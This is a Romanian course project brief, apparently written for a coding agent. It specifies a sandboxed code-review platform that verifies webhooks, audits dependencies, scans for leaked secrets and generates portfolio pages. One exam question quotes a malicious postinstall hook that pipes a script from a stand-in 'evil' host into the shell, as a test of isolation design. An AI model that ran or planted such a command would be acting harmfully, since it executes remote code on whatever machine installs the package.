# P29 · Code review automat pe webhook + portofoliu

> Brief de proiect pentru agent. Sursa cerințelor: catalogul de proiecte Tehnologii Web II, Runda 1.
>
> **Cum folosește agentul acest document:**
>
> - Secțiunile 1-6 sunt **cerințe fixe din catalog**. Nu se negociază și nu se reinterpretează.
> - Secțiunea 7 conține **decizii luate de student**. Doar acestea pot deveni intrări `D-` aprobate.
> - Secțiunea 8 conține **întrebări deschise**. Fiecare devine o intrare `Q-`. Agentul nu alege în locul studentului.
> - Ce nu apare aici nu se inventează: devine întrebare `Q-`.

**Categorie:** F · Dev tools & operare
**Dificultate:** ★★★★★
**Efort estimat:** ~45h
**Format:** Runda 1 · 1 student (individual)

---

## 1. Pe scurt

Platformă care se conectează la repo-urile reale ale colegilor prin OAuth și webhook-uri, rulează la fiecare push analize (lint, număr de teste, complexitate, vulnerabilități în dependențe, secrete scăpate) în medii izolate, păstrează istoricul, comentează pe PR-uri, generează badge-uri și o pagină de portofoliu per developer.

## 2. Context real

Profesorii ar vrea să vadă, fără să deschidă 60 de repo-uri, cine are teste, cine a lăsat o cheie de API în cod și cine a făcut 40 de commit-uri în ultima noapte. Studenții ar vrea o pagină de portofoliu generată din munca lor reală, nu scrisă de mână.

## 3. Cerințe funcționale (must)

- **Login cu OAuth GitHub** (sau GitLab); listarea repo-urilor; conectare prin crearea automată a webhook-ului (și ștergerea lui la deconectare).
- **La fiecare push / PR:** clonare în mediu izolat, rulare de analize configurabile per repo:
  - lint (JS / PHP / Python, după detecție);
  - numărarea și rularea testelor, dacă există;
  - metrici de complexitate;
  - **audit de dependențe** (`npm audit` / `composer audit` / `pip-audit`);
  - **scanare de secrete** (pattern-uri + entropie);
  - dimensiunea diff-ului.
- **Rezultate per commit** cu istoric și grafice de tendință (complexitate în creștere? teste în scădere?); comparație între commit-uri.
- **Comentariu automat pe PR** cu rezumatul (prin API-ul GitHub), configurabil și cu posibilitatea de a-l dezactiva per repo.
- **Badge-uri SVG** (teste, vulnerabilități, "ultimul scan") pentru README, generate dinamic și cache-uite.
- **Pagină publică de portofoliu** per developer: proiecte, stack detectat, activitate (commit-uri pe săptămână, nu "linii de cod"), insigne; dezactivabilă.
- **Vizualizare pentru profesor:** toate repo-urile unei "clase", semnale de risc (secret găsit, fără teste, activitate concentrată în ultimele 48h), export.
- **Roluri:** developer, profesor (clase), admin.

## 4. Cerințe tehnice specifice

- **Verificarea semnăturii** webhook-urilor (HMAC) și **idempotența** la redelivery (același delivery id de două ori = o singură analiză); test.
- Analizele rulează într-un **mediu izolat** (container cu limite de CPU / memorie / timp / fără rețea după instalarea dependențelor, sau echivalent documentat); **serverul web nu rulează niciodată cod din repo**.
- **Coadă cu concurență limitată**, **anularea job-urilor învechite** (3 push-uri rapide = rulează doar ultimul), retry pentru erori de infrastructură, **nu** pentru erori de cod.
- Secretele găsite se raportează **fără a stoca valoarea** (doar tipul, fișierul, linia, un hash parțial).

### Twist: cod străin, pe serverul tău, în siguranță și la timp

Clonezi și rulezi cod pe care nu l-ai scris tu. Un repo poate avea un script `postinstall` rău intenționat, un test care rulează la infinit, un `node_modules` de 2 GB sau un repo de 5 GB cu istoric.

- Izolarea trebuie să reziste la toate (test cu un repo "capcană" construit de student).
- Cozile trebuie să rămână sănătoase: un repo mare nu blochează restul, job-urile învechite se anulează, un worker care moare la mijloc nu lasă job-ul "în lucru" pentru totdeauna.
- Scanarea de secrete trebuie să prindă cheile reale (AWS, GitHub, Stripe, JWT, `.env` commise) și să aibă o rată de alarme false suportabilă (măsurătoarea se documentează pe cele 5 repo-uri).

## 5. Definition of Done

- [ ] 5 repo-uri reale sunt conectate live minim 2 săptămâni; istoricul de analize e vizibil.
- [ ] Repo-ul "capcană" nu scapă din izolare și nu blochează coada (test).
- [ ] Webhook-urile sunt verificate și idempotente; job-urile învechite se anulează (test).
- [ ] Un PR real a primit comentariul automat; un README real are badge-ul.
- [ ] Feedback-ul celor 3 colegi a redus zgomotul (`DECISIONS.md` cu ce s-a schimbat).

## 6. La susținere se întreabă

- Un repo are `"postinstall": "curl evil.sh | sh"`: ce se întâmplă în sistem, pas cu pas?
- Cum știi că un job e învechit și cum îl anulezi dacă rulează deja?
- Cum raportezi o cheie AWS găsită fără să o stochezi și cum ai măsurat alarmele false?

## 8. Întrebări deschise (devin `Q-`)

- **Q:** GitHub App sau OAuth App? (Cerința spune "OAuth GitHub" + crearea automată a webhook-ului. Un GitHub App acoperă ambele și comentează pe PR ca bot. De confirmat cu profesorul.)
- **Q:** Mecanismul de izolare ales și limitele lui (CPU, memorie, timp, disc, rețea).
- **Q:** Cum primește mediul local webhook-uri în dezvoltare (smee.io, tunel Cloudflare etc.)?
- **Q:** Ce semnale de risc vede profesorul, în forma finală (de validat cu developerul din industrie).
- **Q:** Ce analize sunt activate implicit per repo și care sunt opționale.

## 9. Variabilele proiectului (le alege studentul)
